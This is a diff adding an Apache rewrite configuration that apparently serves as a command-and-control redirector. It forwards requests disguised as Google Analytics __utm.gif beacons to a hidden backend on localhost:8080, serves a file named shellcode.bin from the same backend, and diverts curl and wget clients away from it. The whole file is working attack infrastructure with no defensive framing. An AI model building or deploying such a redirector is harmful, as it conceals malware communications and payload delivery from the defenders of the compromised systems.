@@ -1,0 +1,22 @@
+RewriteEngine on
+
+RewriteCond %{REQUEST_METHOD} GET [NC]
+RewriteCond %{HTTP_COOKIE} SESSIONID
+RewriteCond %{REQUEST_URI} __utm.gif
+RewriteCond %{QUERY_STRING} utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
+RewriteRule ^.*$ http://localhost:8080%{REQUEST_URI} [P,L]
+
+RewriteCond %{REQUEST_METHOD} POST [NC]
+RewriteCond %{REQUEST_URI} ___utm.gif
+RewriteCond %{QUERY_STRING} utmac=UA-220(.*)-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
+RewriteRule ^.*$ http://localhost:8080%{REQUEST_URI} [P,L]
+
+RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
+RewriteRule ^a|b|c|d$ diversion [PT]
+
+RewriteCond /var/www/html/%{REQUEST_URI} -f
+RewriteRule ^.*$ %{REQUEST_FILENAME} [L]
+
+RewriteCond %{REQUEST_METHOD} GET [NC]
+RewriteCond %{REQUEST_URI} shellcode.bin
+RewriteRule ^.*$ http://localhost:8080%{REQUEST_URI} [P,L]
